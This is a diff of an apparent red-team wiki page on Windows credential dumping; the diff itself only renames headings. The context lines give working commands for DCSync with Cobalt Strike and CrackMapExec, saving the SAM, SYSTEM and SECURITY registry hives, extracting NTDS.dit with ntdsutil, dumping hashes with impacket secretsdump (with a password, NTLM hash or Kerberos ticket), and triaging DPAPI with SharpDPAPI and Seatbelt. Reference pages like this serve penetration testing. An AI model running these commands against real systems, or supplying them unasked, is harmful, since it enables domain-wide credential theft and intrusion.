@@ -1,6 +1,8 @@
-# DCSync
+# Methods of Credential Dumping
 
-## Cobalt Strike
+## DCSync
+
+### Cobalt Strike
 
 Cobalt Strike offers the “dcsync” command which is a wrapper for mimikatz.
 
@@ -10,7 +12,7 @@ If you have domain admin trust established with the domain controller, this will
 dcsyn <domain.fqdn>
 ```
 
-## CrackMapExec
+### CrackMapExec
 
 Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional.
 
@@ -18,7 +20,7 @@ Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional.
 crackmapexec smb <target> -u admin -p Password123 -d domain --ntds <drsuapi|vss>
 ```
 
-## Manual DCSync using vssadmin
+### Manual DCSync using vssadmin
 
 ```
 reg save hklm\sam SAM
@@ -30,7 +32,7 @@ reg save hklm\system SYSTEM
 reg save hklm\security SECURITY
 ```
 
-## Manual NTDS.dit Extraction using ntdsutil
+### Manual NTDS.dit Extraction using ntdsutil
 
 ```
 ntdsutil "ac in ntds" i "cr fu c:\temp" q q
@@ -42,13 +44,13 @@ After doing one of the two manual methods, convert to a readable format with imp
 impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
 ```
 
-# Local SAM and LSA
+## Local SAM and LSA
 
-## Cobalt Strike
+### Cobalt Strike
 
 Use the built-in `hashdump` command to dump local SAM hashes.
 
-## Impacket
+### Impacket
 
 Use secretsdump.py to extract credentials remotely. You can do this using a password, NTLM Hash, or with a Kerberos ticket. Also supports extracting credentials from local files.
 
@@ -71,7 +73,7 @@ secretsdump.py domain\username@target -k -no-pass
 {.is-info}
 
 
-## CrackMapExec
+### CrackMapExec
 
 Extract hashes from SAM using plaintext password(-p flag):
 
@@ -85,7 +87,7 @@ Extract hashes from LSA using NTLM hash (-H flag):
 crackmapexec smb <target> -u admin -H <NTLM_HASH> -d domain --lsa
 ```
 
-## SeatBelt
+### SeatBelt
 
 Extract hashes from Security Auth Packages. By default this is usually just NTLMv2.
 
@@ -93,7 +95,7 @@ Extract hashes from Security Auth Packages. By default this is usually just NTLM
 Seatbelt.exe SecPackageCreds
 ```
 
-## Manual Method
+### Manual Method
 
 From the compromised machines, navigate to C:\Windows\System32\Config. This is where the SAM, SYSTEM, and Security hives are located. You cant create a copy using copy because there’s a write block on the files. Save to another location using reg save:
 
@@ -109,9 +111,9 @@ reg save hklm\security SECURITY
 
 Copy over the files, SAM, SYSTEM, and SECURITY, which should now be in the current working directory to your local system and use impacket to convert them into a readable format with the command:`impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL`
 
-# DPAPI
+## DPAPI
 
-## User/Machine Triaging
+### User/Machine Triaging
 
 List all user credentials, vault, and RDG DPAPI blobs using a password. Can also be run without a password if the beacon is running under the user's context.
 
@@ -121,7 +123,7 @@ List all system credentials and vault DPAPI blobs. You need admin rights to exec
 
 `SharpDPAPI.exe machinetriage`
 
-## Domain Backup Key
+### Domain Backup Key
 
 List user credentials, vaults, and RDG blobs on a remote system using a domain backup key.
 
